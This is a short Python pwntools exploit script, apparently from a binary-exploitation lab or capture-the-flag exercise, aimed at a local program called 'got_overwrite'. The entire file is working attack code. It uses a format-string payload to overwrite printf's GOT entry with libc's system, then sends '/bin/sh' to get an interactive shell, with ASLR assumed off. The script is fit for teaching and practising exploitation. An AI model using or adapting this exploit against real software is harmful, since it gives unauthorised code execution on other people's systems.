from pwn import *

context.log_level = 'debug'
elf = context.binary = ELF('./got_overwrite')
libc = elf.libc
libc.address = 0x00007ffff7dcb000  # ASLR disabled

p = process()
info(elf.got['printf'])
info(libc.sym['system'])
payload = fmtstr_payload(10, {elf.got['printf']: libc.sym['system']})
p.sendline(payload)
p.sendline('y')

p.clean()

p.sendline('/bin/sh')

p.interactive()
